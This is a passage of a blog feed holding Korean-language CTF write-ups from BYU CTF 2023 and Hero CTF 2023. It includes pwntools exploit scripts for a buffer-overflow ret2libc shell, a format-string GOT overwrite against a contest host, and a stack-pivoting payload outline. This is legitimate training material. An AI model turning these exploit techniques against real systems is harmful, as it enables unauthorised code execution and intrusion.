class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vfs1&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./vfs1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span></span><br><span class="line">contents = <span class="string">b&#x27;b&#x27;</span> * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, filename)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, contents)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> printf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - 2038</title>
      <link href="/230523-byuctf2023-2038/"/>
      <url>/230523-byuctf2023-2038/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I know you really want the flag, so I‚Äôll print it out for you, but only after January 1st, 2024 :)<br>nc byuctf.xyz 40007<br>tag: easy</p></blockquote><ul><li>[215 solves &#x2F; 100 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, nptr);</span><br><span class="line">v6 = atoi(nptr);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v6 &gt; <span class="number">1704067199</span> )</span><br><span class="line">&#123;</span><br><span class="line">  timer = v6;</span><br><span class="line">  v4 = ctime(&amp;timer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSpecified datetime - %s\n&quot;</span>, v4);</span><br><span class="line">  v8 = time(<span class="number">0LL</span>);</span><br><span class="line">  v5 = ctime(&amp;v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Current datetime - %s\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">if</span> ( timer &gt;= v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;print_flag&#x27; was not run because specified date has not occurred yet. Exiting...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Time requirement has been met. Running &#x27;print_flag&#x27;...&quot;</span>);</span><br><span class="line">    print_flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏÇ¨Ïã§ ÏûêÏÑ∏Ìûà ÏïàÎ≥¥Í≥† Î∞îÎ°ú ÌíÄÏóàÎã§. ÏûÖÎ†•Í∞íÏù¥ 1704067199Î≥¥Îã§ ÌÅ¨Î©¥ ifÎ¨∏Ïóê Îì§Ïñ¥Í∞ÄÍ∏∏Îûò Î®ºÏ†Ä Ïù¥Í±∏ Î™©ÌëúÎ°ú Ï†ÄÍ±∞Î≥¥Îã§ ÌÅ∞ ÏàòÎ•º Ï£ºÏóàÎã§. Í∑∏Îû¨ÎçîÎãà Ïö¥ Ï¢ãÍ≤åÎèÑ <code>print_flag</code> Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêòÏóàÎã§. „Öé</p><p>Ï∞∏Í≥†Î°ú timeÌï®ÏàòÏóê ÎÑêÍ∞íÏùÑ ÎÑ£Í≤å ÎêòÎ©¥ 1970ÎÖÑ 1Ïõî 1Ïùº 0Ïãú Ïù¥ÌõÑÎ∂ÄÌÑ∞ ÌòÑÏ†úÍπåÏßÄÏùò ÏãúÍ∞ÑÏù¥ Ï¥àÎ°ú Î≥ÄÌôòÎêú Í∞íÏù¥ Î∞òÌôòÎêúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./2038&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./2038&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">21704067199</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - frorg</title>
      <link href="/230523-byuctf2023-frorg/"/>
      <url>/230523-byuctf2023-frorg/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I love arnimals like frorggies and crarbs and octurpurse<br>nc byuctf.xyz 40015<br>tag: hard </p></blockquote><ul><li>[45 solves &#x2F; 463 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>Ïù¥ Î¨∏Ï†úÎäî ÏÜåÏä§ ÏΩîÎìúÍ∞Ä Ï£ºÏñ¥Ï†∏ ÏûàÏßÄ ÏïäÏïÑÏÑú IDAÎ°ú Î∞îÏù¥ÎÑàÎ¶¨ Î∂ÑÏÑùÌï¥Ïïº ÌïúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I love frorggies so much! So much I made this application to store all the frorgie names you want&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many frorgies you want to store? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4[<span class="number">0</span>]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter frorgy name: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v4[<span class="number">1</span>] + <span class="number">10</span> * i, <span class="number">0xA</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>main ÏûêÏ≤¥Îäî Í∞ÑÎã®ÌïòÎã§. Î™ÖÎ∞±ÌïòÍ≤å bofÍ∞Ä Î∞úÏÉùÌïòÎäîÎç∞ Ïù¥ bofÎ•º Î™á Î≤à ÏùºÏúºÌÇ¨ÏßÄ ÎÇ¥Í∞Ä ÏßÄÏ†ïÌï† Ïàò ÏûàÎã§. Î¨∏Ï†úÎäî 10Í∏ÄÏûêÏî© ÏûÖÎ†•Ìï† Ïàò ÏûàÏñ¥ÏÑú ÏõêÌïòÎäî Ï£ºÏÜåÎ•º ÏûÖÎ†•Ìï† Îïå Ìå®Îî©ÏùÑ Ïûò Ï£ºÎ©¥ÏÑú Ìï¥Ïïº ÌïúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">___(*6)___ _x_    | __(&amp;4)__ __(*4)__</span><br><span class="line">_(^2)_ ___(&amp;6)___ | ____(^8)____</span><br><span class="line">____(%8)____      | ___x___ _(%2)_</span><br></pre></td></tr></table></figure><p>*, &amp;, ^, % ÏàúÏÑúÎ°ú Í∞íÏùÑ Ï§ÄÎã§Í≥† ÏÉùÍ∞ÅÌïòÎ©¥ ÎêúÎã§.</p><p>Îëê Î≤àÏß∏ Î©îÏù∏ÏóêÏÑúÎäî <code>/bin/sh</code> Î¨∏ÏûêÏó¥ ÏúÑÏπòÎ•º &amp;Î≤àÏß∏Ïóê ÎÑ£Í≥† Ïã∂ÏóàÎäîÎç∞ libc Ï£ºÏÜåÎäî 6Î∞îÏù¥Ìä∏Î°ú ÎÅùÎÇòÏßÄ ÏïäÏïÑÏÑú ^Î≤àÏß∏Ïóê ÎÑ£Ïñ¥Ïïº ÌñàÎã§. Í∑∏ÎûòÏÑú <code>pop rdi</code> Ï†ÑÏóê <code>ret</code>ÏùÑ ÎÑ£Ïñ¥Ï§òÏÑú <code>/bin/sh</code> Î¨∏ÏûêÏó¥ ÏúÑÏπòÎ•º ^Î≤àÏß∏Ïóê Ï£ºÎäî Í≤ÉÏóê ÏÑ±Í≥µÌñàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./frorgp&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./frorgp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011e5</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">paylaod</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, paylaod)</span><br><span class="line">    info(<span class="string">&quot;send&quot;</span>)</span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">name(p32(pop_rdi).rjust(<span class="number">0xa</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">name(p32(<span class="number">0x0</span>) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>]).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 00 00 40 ?? ??</span></span><br><span class="line">name(<span class="string">b&#x27;\x00\x00&#x27;</span> + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">name(p64(e.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc.address = libc_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccond main</span></span><br><span class="line"><span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">name(p32(ret).rjust(<span class="number">0xa</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># ret</span></span><br><span class="line">name(p32(<span class="number">0x0</span>) + p32(pop_rdi).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 00 00 40 ?? ??</span></span><br><span class="line">name(<span class="string">b&#x27;\x00\x00&#x27;</span> + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))))</span><br><span class="line">name(p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(pop_rdi).ljust(6, b&#x27;\x00&#x27;)</span><br><span class="line">00 00 40 ?? ??</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 review</title>
      <link href="/230518-heroctf2023-0review/"/>
      <url>/230518-heroctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><img src="/images/230518-heroctf2023-0review/Screenshot 2023-05-18 at 15.17.19.png" width=450/><br><p>Ïû¨Î∞åÎäî Î¨∏Ï†úÍ∞Ä ÎßéÏïòÎã§. ÎÇúÏù¥ÎèÑÎäî ÏÉùÍ∞ÅÎ≥¥Îã§ Ïñ¥Î†§Ïõ†Îçò Í≤É Í∞ôÎã§. easy 2 Î¨∏Ï†ú, medium 1, hard 2 Î¨∏Ï†ú ÏòÄÎäîÎç∞,.. Unknown Î¨∏Ï†úÎäî ÌíÄÎã§Í∞Ä Í≤∞Íµ≠ Î™ªÌíÄÏóàÎã§. syscall Î¨∏Ï†úÏù∏Îç∞, Í∞ÄÏ†ØÎì§Ïù¥ ÎÑàÎ¨¥ ÍπåÎã§Î°úÏö∏ ÎøêÎßåÏù¥ ÏïÑÎãàÎùº rax Î†àÏßÄÏä§ÌÑ∞Î•º Ï°∞Ï†àÌïòÍ∏∞Í∞Ä Îß§Ïö∞ Ïñ¥Î†§Ïõ†Îã§. Í±∞Í∏∞Îã§Í∞Ä Í∞ÄÏ†ØÏùÄ ÏùµÏàôÌïòÏßÄÎèÑ ÏïäÏùÄ xmm Î†àÏßÄÏä§ÌÑ∞Î°ú Ï≤òÏùå Î≥¥Îäî Î™ÖÎ†πÏñ¥Î•º Ïù¥Ïö©ÌïòÏó¨ ÎÜÄÍ≥† ÏûàÏñ¥ÏÑú Î°∏ÏóÖÏùÑ Î¥êÎèÑ Ïù¥Ìï¥Í∞Ä Ïûò ÏïàÎêêÎã§. „Öé„Öé; ÎßàÏßÄÎßâ Î¨∏Ï†úÎäî tcacheÎ•º Ïù¥Ïö©Ìïú heap Î¨∏Ï†úÎùºÏÑú Î≥¥ÏßÄ ÏïäÏïòÎã§.</p><p>ÎÇ¥Í∞Ä Ìëº Î¨∏Ï†úÎì§ Ï§ëÏóêÏÑú easy Îëê Î¨∏Ï†úÎäî Í¥úÏ∞ÆÏïòÍ≥†, medium Î¨∏Ï†úÎäî ÏÉùÍ∞ÅÎ≥¥Îã§ Ïñ¥Î†§Ïõ†Îã§. ÏöîÏ¶ò syscallÏùÑ Ïù¥Ïö©ÌïòÎäî Î¨∏Ï†úÍ∞Ä ÏûêÏ£º Î≥¥Ïù¥ÎäîÎç∞, Î™®Îì† Í∞ÄÏ†ØÏùÑ ÍººÍººÌïòÍ≤å Î≥¥Îäî Î≤ÑÎ¶áÏùÑ Îì§Ïó¨ÏïºÍ≤†Îã§Îäî ÏÉùÍ∞ÅÏùÑ ÌïòÏòÄÎã§. Í∑∏Î¶¨Í≥† <code>execve</code>Î•º Ïã§ÌñâÏãúÌÇ§Í≥† Ïã∂ÏùÑ Îïå, Ïù∏ÏûêÎäî Ïñ¥ÎîîÏóê Ï†ÄÏû•Ìï¥ÏïºÌïòÎäî ÏßÄÎèÑ ÎààÏπòÏûàÍ≤å ÏÉùÍ∞ÅÌï¥ÏïºÍ≤†Îã§.</p><ul><li><a href="https://jiravvit.github.io/230518-heroctf2023-appointment-book/">https://jiravvit.github.io/230518-heroctf2023-appointment-book/</a></li><li><a href="https://jiravvit.github.io/230518-heroctf2023-impossible-v2/">https://jiravvit.github.io/230518-heroctf2023-impossible-v2/</a></li><li><a href="https://jiravvit.github.io/230518-heroctf2023-rope-dancer/">https://jiravvit.github.io/230518-heroctf2023-rope-dancer/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Impossible v2 (fsb)</title>
      <link href="/230518-heroctf2023-impossible-v2/"/>
      <url>/230518-heroctf2023-impossible-v2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>Your colleague trolls you again by giving you an impossible challenge, betting $200 that, this time, you won‚Äôt succeed. Show him that this impossible challenge is in fact easy!<br>Host : nc static-03.heroctf.fr 5001<br>Format : Hero{flag}<br>Author : SoEasY<br>easy</p></blockquote><ul><li>[41 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏïÑÎûòÏ≤òÎüº <code>fsb</code>Í∞Ä Î∞úÏÉùÌïúÎã§. (<code>buf</code>Í∞Ä Ïö∞Î¶¨Ïùò ÏûÖÎ†•Í∞íÏù¥Îã§.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(message, buf);</span><br></pre></td></tr></table></figure><p><code>message</code>Î•º Ï∂úÎ†•Ìï¥Ï£ºÎäî Í∏∞Îä•Ïù¥ ÏóÜÍ∏∞ ÎïåÎ¨∏Ïóê Î≠îÍ∞Ä leakÌï†ÏàòÍ∞Ä ÏóÜÎã§. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">b&#x27;_%p&#x27;</span> * <span class="number">8</span></span><br></pre></td></tr></table></figure><p>ÏúÑ paylaodÎ°ú ÏûÖÎ†•ÏùÑ Î≥¥ÎÇ¥Í≥† ÎîîÎ≤ÑÍ±∞ ÏÉÅÏúºÎ°ú <code>message</code>Î•º ÌôïÏù∏ÌïòÎ©¥ ÏïÑÎûòÏôÄ Í∞ôÏù¥ offsetÏù¥ 7ÏûÑÏùÑ ÌôïÏù∏Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/s 0x000000004040e0</span><br><span class="line">0x4040e0 &lt;message&gt;:     &quot;aaaaaaaa_0x21_0x7f30b4e66931_0x14278b1_(nil)_(nil)_0x14276b0_0x6161616161616161_0x255f70255f70255f\n&quot;</span><br></pre></td></tr></table></figure><p><code>fsb</code>Í∞Ä Î∞úÏÉùÌïú ÌõÑ, <code>if (!memcmp(message, expected, 0x10uLL))</code>Í∞Ä Ï∞∏Ïù¥Î©¥ <code>flag.txt</code>Î•º Ï∂úÎ†•Ìï¥Ï§ÄÎã§.</p><p><code>pie</code>ÎèÑ ÏïàÍ±∏Î†§ÏûàÏúºÎãà <code>memcmp@got</code>Ïóê <code>flag.txt</code>Í∞Ä Ï∂úÎ†•ÎêòÎäî Ï£ºÏÜåÎ•º ÎçÆÏñ¥Ï§¨Îã§. Í∏∏Ïù¥Í∞Ä Ï∂©Î∂ÑÌïòÏßÄ ÏïäÏúºÎãà 2Î∞îÏù¥Ìä∏Îßå ÎçÆÏñ¥Ï£ºÏóàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./impossible_v2&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./impossible_v2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 7</span></span><br><span class="line"><span class="comment"># payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload += b&#x27;a&#x27; * 8</span></span><br><span class="line"><span class="comment"># payload += b&#x27;_%p&#x27; * 8</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;e.got[<span class="string">&#x27;memcmp&#x27;</span>] : p16(<span class="number">0x14B7</span>)&#125;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;e:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># der $_got()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - stack pivoting</title>
      <link href="/230518-pwn-stack-pitvoting/"/>
      <url>/230518-pwn-stack-pitvoting/</url>
      
        <content type="html"><![CDATA[<ol><li>rbpÎ•º jumpÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜå -8Î°ú ÏÑ∏ÌåÖ (rop Í∞ÄÏ†ØÏù¥ ÏûàÎäî Í≥≥ - 8)</li><li>retÎ•º leave_retÏ£ºÏÜåÎ°ú Î≥ÄÍ≤Ω</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * dummy</span><br><span class="line">payload += p64(rop_payload - <span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Rope Dancer (srop, stack pivoting)</title>
      <link href="/230518-heroctf2023-rope-dancer/"/>
      <url>/230518-heroctf2023-rope-dancer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>A circus has just opened near you and you would love to work there as a rope dancer. Perhaps you could access their recruitment criteria to maximize your chances of being selected?<br>Host : nc static-03.heroctf.fr 5002<br>Format : Hero{flag}<br>Author : SoEasY<br>medium</p></blockquote><ul><li>[31 solves &#x2F; 460 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 